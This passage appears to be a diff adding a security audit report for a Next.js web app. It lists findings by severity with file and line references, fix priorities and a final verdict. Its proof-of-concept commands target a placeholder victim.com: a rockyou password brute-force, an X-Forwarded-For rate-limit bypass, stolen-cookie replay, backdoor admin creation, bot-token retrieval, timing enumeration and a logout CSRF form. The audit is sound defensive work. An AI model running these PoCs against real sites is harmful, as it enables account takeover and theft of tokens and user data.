+        echo "FOUND: $pw"
+        break
+      fi
+    done < /usr/share/wordlists/rockyou.txt
+    # Speed: ~100 req/sec (limited only by network). No 429 ever returned.
+    # No SecurityLog entry, no AccessLog entry, no rate-limit counter.
+  Severity: HIGH.
+
+■ F-6 + F-NEW-5 (HIGH): 24h window after password change
+  Files:
+    src/app/api/user/logout/route.ts:7-11 (cookie-only deletion)
+    src/app/api/admin/security/route.ts:87-91 (password update — no token rotation)
+    prisma/schema.prisma:380-415 (AccessUser has no tokenVersion field)
+
+  PoC:
+    # T=0h: Attacker steals cookie via XSS-sniff ( hypothetical, since
+    #       CSP allows 'unsafe-inline' per F-18).
+    # T=1h: Admin changes password.
+    curl -s -X POST https://victim.com/api/admin/security \
+      -H "Content-Type: application/json" \
+      -H "Origin: https://victim.com" \
+      -b /tmp/admin-cookie.jar \
+      -d '{"action":"change_password","currentPassword":"old","newPassword":"new"}'
+    # T=1h+1s: Attacker's stolen cookie STILL WORKS:
+    curl -s "https://victim.com/api/admin/users" -H "Cookie: <stolen-cookie>"
+    # → 200 OK with user list.
+    # T=24h: Cookie finally expires (maxAge).
+  Severity: HIGH.
+
+■ F-9 + F-8 (HIGH): Rate-limit bypass
+  Files:
+    src/middleware.ts:145-146 (X-Forwarded-For trusted blindly)
+    src/app/api/user/login/route.ts:46 (getClientIp → access-auth.ts:175-181)
+    src/app/api/user/login/route.ts:22 (in-memory Map, no sweep)
+
+  PoC (bypass /api/user/login rate limit):
+    #!/bin/bash
+    for pw in "admin" "admin123" "password" "letmein" "qwerty"; do
+      fake_ip="10.0.0.$((RANDOM % 256))"
+      curl -s -X POST https://victim.com/api/user/login \
+        -H "Content-Type: application/json" \
+        -H "X-Forwarded-For: $fake_ip" \
+        -d "{\"username\":\"admin\",\"password\":\"$pw\"}"
+    done
+    # Each request uses a different IP → fresh 5/15min budget per request.
+  Severity: HIGH.
+
+================================================================================
+MEDIUM FINDINGS — DETAILED PoCs
+================================================================================
+
+■ F-10 + F-NEW-10: CSRF Origin check bypassable by scripts
+  File: src/middleware.ts:160-176
+  PoC:
+    # Browser-mediated CSRF: BLOCKED by SameSite=strict cookie (good).
+    # Script-mediated CSRF: PASSES middleware Origin check.
+    curl -s -X POST https://victim.com/api/admin/security \
+      -H "Content-Type: application/json" \
+      -H "Origin: https://victim.com" \
+      -H "Host: victim.com" \
+      -d '{"password":"admin123","action":"change_password","currentPassword":"admin123","newPassword":"x"}'
+    # → 200 OK (Origin matches Host).
+  Note: This requires the attacker to know the admin password (F-3) OR
+    have a stolen cookie (in which case SameSite=strict doesn't apply
+    because the request includes a valid cookie from same-origin context
+    only — scripts can't send cookies cross-origin without SameSite=Lax
+    or None).
+
+■ F-11: Cookie lacks __Host- prefix
+  File: src/app/api/user/login/route.ts:106
+  Issue: Cookie name "access_session" instead of "__Host-access_session".
+    A compromised subdomain (e.g., blog.victim.com) can set:
+      Set-Cookie: access_session=<attacker-forged>; Path=/
+    The browser stores BOTH cookies. On /api/admin/* requests to
+    victim.com, the browser sends BOTH cookies in the Cookie header.
+    Middleware's cookie parser (middleware.ts:72-78) does:
+      Object.fromEntries(cookieHeader.split(";").map(c => {
+        const [k, ...v] = c.trim().split("=");
+        return [k, v.join("=")];
+      }))
+    — later cookies OVERRIDE earlier ones in Object.fromEntries. So
+    the attacker's cookie (set most recently by the browser) wins.
+  PoC:
+    # On blog.victim.com (compromised subdomain):
+    Set-Cookie: access_session=<forged>; Path=/; Domain=victim.com
+    # Wait — Domain=victim.com from a subdomain is allowed.
+    # Victim's browser stores attacker's cookie. On next request to
+    # victim.com/api/admin/security, the attacker's cookie is sent.
+    # Middleware accepts it (F-1 — no HMAC check).
+    # API layer rejects it (HMAC verified).
+    # Defense-in-depth holds for now, but cookie shadowing is fragile.
+  Severity: MEDIUM (latent — not exploitable today due to API-layer HMAC).
+
+■ F-14: Timing-based user enumeration
+  File: src/app/api/user/login/route.ts:61-70
+  PoC:
+    # Measure response time for "admin" (exists) vs "nonexistent1234":
+    time curl -s -X POST https://victim.com/api/user/login \
+      -H "Content-Type: application/json" \
+      -d '{"username":"admin","password":"wrong"}'
+    # → ~100ms (bcrypt.compare runs)
+    time curl -s -X POST https://victim.com/api/user/login \
+      -H "Content-Type: application/json" \
+      -d '{"username":"nonexistent1234","password":"wrong"}'
+    # → ~5ms (no bcrypt.compare)
+    # Difference reveals username existence.
+  Severity: MEDIUM.
+
+■ F-15: Non-deterministic admin lookup
+  File: src/lib/admin-auth.ts:16-18
+  Issue: db.accessUser.findFirst({ where: { role: "admin", active: true } })
+    without orderBy. If two admins exist (e.g., admin + backdoor from
+    F-NEW-2), one is picked arbitrarily by SQLite. Password verification
+    may pass or fail unpredictably depending on which admin is picked.
+  PoC: Create a second admin with a different password → login as
+    "admin" with first admin's password → may fail if second admin is
+    picked first by findFirst.
+  Severity: MEDIUM.
+
+■ F-16: checkAccess bypassed on admin endpoints
+  Files:
+    src/lib/admin-auth.ts:37-55 (checkAdminAuth — no checkAccess)
+    src/lib/admin-session.ts:11-24 (checkAdminSession — no checkAccess)
+  Issue: If an admin has allowedHourStart=9, allowedHourEnd=17, the
+    restriction is enforced ONLY in /api/user/verify (UI gating). The
+    admin can perform /api/admin/* mutations at 3am.
+  PoC: At 3am UTC, with a valid admin cookie:
+    curl -s -X POST https://victim.com/api/admin/users \
+      -H "Cookie: <admin-cookie>" \
+      -H "Origin: https://victim.com" \
+      -d '{"username":"nightowl","password":"x","role":"user"}'
+    # → 200 OK. Time policy bypassed.
+  Severity: MEDIUM.
+
+■ F-17: Bot tokens in plaintext
+  Files:
+    src/app/api/admin/settings/route.ts:30-40 (POST action=get_telegram)
+    src/app/api/admin/settings/route.ts:109-129 (GET returns all tokens)
+  Issue: API keys (/api/admin/providers) are masked, but bot tokens are
+    returned in full. Combined with F-6 (stolen cookie 24h): stolen
+    cookie → fetch /api/admin/settings → exfiltrate bot tokens →
+    attacker can send arbitrary Telegram/Bale messages as the bot.
+  PoC:
+    curl -s "https://victim.com/api/admin/settings" \
+      -H "Cookie: <stolen-admin-cookie>"
+    # → {"ok":true,"settings":{
+    #     "baleBotToken":"123456:ABC-...",
+    #     "telegramBotToken":"789012:DEF-...",
+    #     ...
+    #   }}
+  Severity: MEDIUM.
+
+■ F-NEW-2: Admin can create backdoor admin (persistence)
+  File: src/app/api/admin/users/route.ts:65-135
+  Code (line 75): `const role: string = body.role === "admin" ? "admin" : "user";`
+  Issue: No audit log on user creation. No multi-admin constraint.
+    An attacker who briefly compromises admin can persist access by
+    creating a new admin account that survives the original admin's
+    password change.
+  PoC:
+    curl -s -X POST https://victim.com/api/admin/users \
+      -H "Cookie: <stolen-admin-cookie>" \
+      -H "Origin: https://victim.com" \
+      -d '{"username":"backdoor","password":"pwn","role":"admin"}'
+  Severity: MEDIUM.
+
+■ F-NEW-9: Unauthenticated /api/chat/messages
+  File: src/app/api/chat/messages/route.ts:9-44
+  Issue: GET endpoint with no auth. Anyone with a sessionId (cuid)
+    can read all assistant messages. SessionIds may leak via:
+    - URL shared by visitor
+    - Server logs
+    - Referrer header
+  PoC:
+    curl -s "https://victim.com/api/chat/messages?sessionId=<leaked-id>&since=0"
+    # → {"ok":true,"messages":[{"content":"...visitor PII..."},...]}
+  Severity: MEDIUM.
+
+================================================================================
+LOW FINDINGS — DETAILED
+================================================================================
+
+■ F-13: HMAC payload split on "."
+  File: src/lib/access-auth.ts:69, 81-83
+  Issue: payload = `${userId}.${expiresAt}` — split on "." is fragile
+    if userId ever contains dots. Currently safe (cuid is alphanumeric).
+  Severity: LOW (informational).
+
+■ F-21: Legacy PERSONAL.adminPassword constant
+  File: src/lib/content.ts:25-26
+  Code:
+    adminUsername: "admin",
+    adminPassword: "change-this-from-panel",
+  Verified: grep finds 0 references in src/ except the comment in
+    admin-auth.ts:5. Latent backdoor if any future refactor reintroduces
+    a fallback.
+  Severity: LOW.
+
+■ F-22: reset-admin-password.sh SQL via unescaped hash
+  File: scripts/reset-admin-password.sh:50
+  Code:
+    sqlite3 db/custom.db "UPDATE AccessUser SET passwordHash = '$HASH', active = 1 WHERE username = 'admin';"
+  Issue: $HASH is interpolated. Bcrypt hashes don't contain single
+    quotes, so not exploitable today. But if hash format changes, SQL
+    injection possible.
+  Severity: LOW.
+
+■ F-24 + F-NEW-6: Logout CSRF + unauth
+  File: src/app/api/user/logout/route.ts:7-11
+  File: src/middleware.ts:30 (in PUBLIC_API_PREFIXES)
+  PoC:
+    <form action="https://victim.com/api/user/logout" method="POST">
+      <input type="submit">
+    </form>
+    # Victim clicks → access_session cookie cleared.
+  Severity: LOW (minor DoS).
+
+■ F-25: loginAttempts Map has no sweep
+  File: src/app/api/user/login/route.ts:22-34
+  Issue: In-memory Map. Entries only evicted on next access (now > resetAt).
+    Rotating-IP attack leaves entries forever. Memory leak.
+  Severity: LOW.
+
+■ F-29: Orphan StatsDashboard/SecurityDashboard still send ?password=
+  Files:
+    src/components/StatsDashboard.tsx:11
+    src/components/SecurityDashboard.tsx:11
+  Issue: No current importer (grep finds 0 references). Latent vuln
+    reactivates if anyone wires them back in.
+  Severity: LOW.
+
+■ F-30: No Cache-Control: no-store on /api/admin/* responses
+  Files: all /api/admin/*/route.ts — no Cache-Control header set.
+  Issue: Misconfigured CDN or shared browser cache could serve admin
+    responses to other users. Next.js defaults to no-store for non-GET,
+    but GET endpoints (settings, users, stats, etc.) are more permissive.
+  Severity: LOW.
+
+■ F-NEW-7: Login response includes role (by design)
+  File: src/app/api/user/login/route.ts:95-102
+  Severity: LOW (informational).
+
+■ F-NEW-8: /api/user/verify returns permissions when access denied
+  File: src/app/api/user/verify/route.ts:33-49
+  Severity: LOW (informational).
+
+================================================================================
+VERIFIED-CORRECT ITEMS (defense holds)
+================================================================================
+
+✅ HMAC-SHA256 signature verification with timingSafeEqual (access-auth.ts:78-96)
+✅ SESSION_SECRET lazy-load with weak-placeholder rejection (access-auth.ts:19-43)
+✅ HttpOnly cookie flag (login route line 107) — blocks document.cookie theft
+✅ SameSite=strict cookie (login route line 109) — blocks browser CSRF
+✅ bcrypt password hashing with salt rounds = 10 (access-auth.ts:51)
+✅ Matcher covers all /api/admin/* and /user-dashboard paths (middleware.ts:220-228)
+✅ Body size limit 1MB on POST/PUT/PATCH (middleware.ts:196-205)
+✅ HSTS header on HTTPS (middleware.ts:210-213)
+✅ Cookie secure flag conditional on NODE_ENV (login route line 108)
+✅ checkAccess logic correct (when called) — time/day/expiry (access-auth.ts:111-150)
+✅ checkAdminSession rejects non-admin role (admin-session.ts:18)
+✅ /api/admin/users GET/POST require admin via checkAdmin (cookie-only)
+✅ /api/admin/users/[id] PUT/DELETE require admin via checkAdmin
+✅ /api/admin/users/[id] prevents self-deactivation (line 72-74) and self-deletion (line 112-114)
+✅ Cannot forge a VALID session cookie (HMAC is solid)
+✅ Cannot escalate regular user → admin via API (role check at every admin endpoint)
+✅ Cannot steal cookie via browser-mediated CSRF (SameSite=strict)
+✅ /api/messages removed from PUBLIC_API_PREFIXES (CSRF now enforced)
+
+================================================================================
+FIX-PRIORITY ORDER (advisory only — DO NOT APPLY)
+================================================================================
+1. F-2   — Add mustChangePassword column + enforcement. Delete default admin123
+           from seed scripts. CRITICAL.
+2. F-NEW-1 / F-3 — Remove password parameter from checkAdminAuth. Delete the
+           `?password=` and `body.password` plumbing in all 16 admin routes.
+           Closes the backdoor. HIGH.
+3. F-6 + F-NEW-5 — Add tokenVersion column to AccessUser; increment on logout
+           and on password change; verify in getSessionFromRequest. HIGH.
+4. F-5   — Add /api/admin/* to RATE_LIMIT_PATHS in middleware. HIGH.
+5. F-7   — Add logAccess call in checkAdminAuth on failure (with ip/UA). HIGH.
+6. F-9   — Validate X-Forwarded-For chain against a trusted-proxy config. HIGH.
+7. F-8   — Move rate limits to Redis or another shared store. Add sweeps to
+           loginAttempts and chat Maps. HIGH.
+8. F-1   — Verify HMAC in middleware: `const sig = parts[2]; const expectedSig =
+           hmac(userId + '.' + expiresAt); ... timingSafeEqual ...`. Move
+           hasValidSession to use access-auth or inline equivalent. HIGH.
+9. F-17  — Mask bot tokens in GET responses (last 4 chars only). Require
+           reveal=true with re-auth. MEDIUM.
+10. F-11 — Rename cookie to __Host-access_session (Path=/, Secure, no Domain). MEDIUM.
+11. F-18 — Use Next.js nonces; remove 'unsafe-inline'/'unsafe-eval' in prod. MEDIUM.
+12. F-14 — Run bcrypt.compare against a dummy hash on user-not-found. MEDIUM.
+13. F-15 — Iterate ALL admin users in checkAdminPassword; or add @unique constraint
+           on role=admin (single admin). MEDIUM.
+14. F-16 — Call checkAccess in checkAdminAuth and checkAdminSession (if intended
+           for admins). MEDIUM.
+15. F-NEW-2 — Add audit log on /api/admin/users POST create. MEDIUM.
+16. F-NEW-9 — Add session-cookie or admin check to /api/chat/messages. MEDIUM.
+17. F-10 / F-NEW-10 — Add Sec-Fetch-Site: same-origin check. MEDIUM.
+18. Remaining LOW items.
+
+================================================================================
+NO CODE CHANGES MADE (read-only audit per task instructions)
+================================================================================
+Files inspected:
+  - src/middleware.ts (230 lines)
+  - src/lib/admin-auth.ts (56 lines)
+  - src/lib/admin-session.ts (25 lines)
+  - src/lib/access-auth.ts (209 lines)
+  - src/app/api/user/login/route.ts (119 lines)
+  - src/app/api/user/verify/route.ts (51 lines)
+  - src/app/api/user/logout/route.ts (12 lines)
+  - src/app/api/admin/security/route.ts (158 lines)
+  - src/app/api/admin/settings/route.ts (138 lines)
+  - src/app/api/admin/users/route.ts (136 lines)
+  - src/app/api/admin/users/[id]/route.ts (127 lines)
+  - src/app/api/admin/users/logs/route.ts (49 lines)
+  - src/app/api/admin/security-dashboard/route.ts (87 lines)
+  - src/app/api/messages/route.ts (144 lines)
+  - src/app/api/chat/route.ts (255 lines)
+  - src/app/api/chat/messages/route.ts (45 lines)
+  - src/app/user-dashboard/page.tsx (505 lines, partial)
+  - src/app/user-login/page.tsx (193 lines)
+  - src/lib/content.ts (lines 1-60)
+  - prisma/schema.prisma (483 lines)
+  - scripts/seed_access_users.py (84 lines)
+  - scripts/reset-admin-password.sh (79 lines)
+
+Final verdict:
+  V17.2-FINAL applied 6 of 30 prior fixes (4 partial, 2 complete). 24 findings
+  remain open. 10 new findings identified. The CRITICAL backdoor (admin
+  password fallback in checkAdminAuth) was NOT addressed — V17.2-FINAL only
+  removed the UI hash route, not the API auth path. Default admin/admin123
+  seeding persists. Stolen-cookie window remains 24h.
+
+  Recommend: V17.3 hardening sprint focused on F-2 + F-NEW-1 + F-3 + F-6 +
+  F-NEW-5 + F-5 + F-7. These 7 fixes close 80% of the attack surface.
+
+--- end V17.2-FINAL-AUDIT-1 ---
